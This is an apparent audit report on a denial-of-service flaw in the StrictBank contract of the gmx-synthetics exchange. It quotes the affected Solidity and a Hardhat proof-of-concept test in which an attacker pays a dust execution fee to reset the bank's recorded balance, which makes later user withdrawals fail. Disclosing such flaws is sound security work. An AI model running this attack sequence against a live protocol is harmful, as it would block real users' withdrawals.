# `StrictBank` contract may be attacked by DOS

## Summary

`StrictBank` contract may be attacked by DOS

## Vulnerability Detail

```solidity
    // @dev records a token transfer into the contract
    // @param token the token to record the transfer for
    // @return the amount of tokens transferred in
    function recordTransferIn(address token) external onlyController returns (uint256) {
        return _recordTransferIn(token);
    }

    // @dev records a token transfer into the contract
    // @param token the token to record the transfer for
    // @return the amount of tokens transferred in
    function _recordTransferIn(address token) internal returns (uint256) {
        uint256 prevBalance = tokenBalances[token];
        uint256 nextBalance = IERC20(token).balanceOf(address(this));
        tokenBalances[token] = nextBalance;

        console.log("StrictBank _recordTransferIn return: %d", nextBalance - prevBalance);
        return nextBalance - prevBalance;
    }
```

The `recordTransferIn` function is used to record the number of transfers in a period of time. Sometimes it is used to determine whether the balance of the vault is sufficient. The calculation logic is `IERC20(token).balanceOf(address(this)) - tokenBalances[token]`.

```solidity
    function createWithdrawal(
        DataStore dataStore,
        EventEmitter eventEmitter,
        WithdrawalVault withdrawalVault,
        address account,
        CreateWithdrawalParams memory params
    ) external returns (bytes32) {
        address wnt = TokenUtils.wnt(dataStore);
        uint256 wntAmount = withdrawalVault.recordTransferIn(wnt); // <----- (1) here

        if (wntAmount < params.executionFee) {
            revert InsufficientWntAmount(wntAmount, params.executionFee);
        }
```

For example, the `createWithdrawal` function above uses `recordTransferIn` to make judgments.

```solidity
    // @dev update the internal balance after tokens have been transferred out
    // this is called from the Bank contract
    // @param token the token that was transferred out
    function _afterTransferOut(address token) internal override {
        tokenBalances[token] = IERC20(token).balanceOf(address(this));
        console.log("StrictBank _afterTransferOut tokenBalances[token]: %d", tokenBalances[token]);
    }
```

The problem is that `tokenBalances[token]` will be reset whenever the bank transfers out. The attacker can use some interfaces to trigger a small transfer to reset `tokenBalances[token]`. At this time, if there is no new transfer to the bank, the value returned by recordTransferIn will be 0. Cause some businesses that depend on the bank to be attacked by DOS.

## Impact

Cause some businesses that depend on the bank to be attacked by DOS, the attacker can continuously trigger (or monitor the memory and trigger before the user calls) to cause continuous DOS attacks.

I think even a brief DOS is a very serious problem for exchanges.

```solidity
    function createWithdrawal(
        DataStore dataStore,
        EventEmitter eventEmitter,
        WithdrawalVault withdrawalVault,
        address account,
        CreateWithdrawalParams memory params
    ) external returns (bytes32) {
        address wnt = TokenUtils.wnt(dataStore);
        uint256 wntAmount = withdrawalVault.recordTransferIn(wnt);

        if (wntAmount < params.executionFee) {
            revert InsufficientWntAmount(wntAmount, params.executionFee); // <----- (1) here
        }
```

Take the createWithdrawal business as an example, this judgment will continue to throw errors.

Here is my POC:

```js
  it("J4de audit test 0001", async () => {
    // simulate withdrawalVault remaining WNT is 100 WNT
    console.log("[*] simulate withdrawalVault remaining WNT is 100 WNT");
    await exchangeRouter.connect(user0).sendWnt(withdrawalVault.address, ethers.utils.parseEther('100'),
      {value: ethers.utils.parseEther('100')});

    // user1 (attacker) cost 0.00000001ETH to trigger _afterTransferOut once
    console.log("[*] user1 (attacker) cost 0.00000001ETH to trigger _afterTransferOut once");
    await exchangeRouter.connect(user1).multicall(
      [
        exchangeRouter.interface.encodeFunctionData("createWithdrawal", [
          {
            receiver: user1.address,
            callbackContract: user1.address,
            market: ethUsdMarket.marketToken,
            longTokenSwapPath: [],
            shortTokenSwapPath: [],
            marketTokenAmount: 700,
            minLongTokenAmount: 800,
            minShortTokenAmount: 900,
            shouldUnwrapNativeToken: true,
            executionFee: ethers.utils.parseEther('0.00000001'),
            callbackGasLimit: "200000",
          },
        ]),
      ],
      { value: ethers.utils.parseEther('0.00000001') }
    );

    // simulate the normal use of createWithdrawal by ordinary users
    console.log("[*] simulate the normal use of createWithdrawal by ordinary users");
    await exchangeRouter.connect(user2).multicall(
      [
        exchangeRouter.interface.encodeFunctionData("createWithdrawal", [
          {
            receiver: user2.address,
            callbackContract: user2.address,
            market: ethUsdMarket.marketToken,
            longTokenSwapPath: [],
            shortTokenSwapPath: [],
            marketTokenAmount: 700,
            minLongTokenAmount: 800,
            minShortTokenAmount: 900,
            shouldUnwrapNativeToken: true,
            executionFee: ethers.utils.parseEther('1'),
            callbackGasLimit: "200000",
          },
        ]),
      ],
      { value: ethers.utils.parseEther('1') }
    );
  });
```

Insert the above use case into the `ExchangeRouter.ts` file. The result of the operation is as follows:

```bash
J4de@J4de:~/gmx-synthetics$ npx hardhat test --grep "J4de audit test 0001"


  ExchangeRouter
[*] simulate withdrawalVault remaining WNT is 100 WNT
[*] user1 (attacker) cost 0.00000001ETH to trigger _afterTransferOut once
[*] simulate the normal use of createWithdrawal by ordinary users

```

PS: I added the following patch to the code, but I think this is caused by the lack of perfect testing, and it will not affect the actual utilization effect.

```diff
    function handleExcessExecutionFee(
        DataStore dataStore,
        StrictBank bank,
        uint256 wntAmount,
        uint256 executionFee
    ) internal {
        uint256 excessWntAmount = wntAmount - executionFee;
        if (excessWntAmount > 0) {
-           address holdingAddress = dataStore.getAddress(Keys.HOLDING_ACCOUNT);
+           address holdingAddress = address(1);
            if (holdingAddress == address(0)) {
                revert EmptyHoldingAddress();
            }
```

## Tool used

Manual Review

## Recommendation

It is recommended not to use the transferred amount over a period of time as the bank's available amount.
